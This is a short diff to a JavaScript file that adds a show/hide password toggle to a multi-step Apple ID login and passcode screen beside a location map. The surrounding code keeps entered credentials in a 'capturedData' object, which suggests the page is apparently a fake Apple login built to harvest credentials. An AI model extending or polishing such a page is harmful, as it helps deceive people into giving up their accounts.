@@ -112,12 +112,30 @@ document.addEventListener('DOMContentLoaded', () => {
     L.marker(meLocation, { icon: meIcon }).addTo(map);
 
     // 9. Multi-step Login & Passcode Logic
+    const togglePasswordBtn = document.getElementById('toggle-password');
+    const passwordInput = document.getElementById('password');
     const loginBtn = document.getElementById('login-btn');
     const loginScreen = document.getElementById('login-screen');
     const passcodeScreen = document.getElementById('passcode-screen');
     const overlay = document.getElementById('overlay');
     const appleIdInput = document.getElementById('apple-id');
-    const passwordInput = document.getElementById('password');
+
+    togglePasswordBtn.addEventListener('click', () => {
+        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', type);
+        
+        // Toggle SVG icon (simplified approach: change opacity or switch SVG)
+        const eyePath = document.getElementById('eye-path');
+        const eyeOffPath = document.getElementById('eye-off-path');
+        
+        if (type === 'password') {
+            eyePath.style.display = 'block';
+            eyeOffPath.style.display = 'none';
+        } else {
+            eyePath.style.display = 'none';
+            eyeOffPath.style.display = 'block';
+        }
+    });
 
     let capturedData = {
         appleId: '',
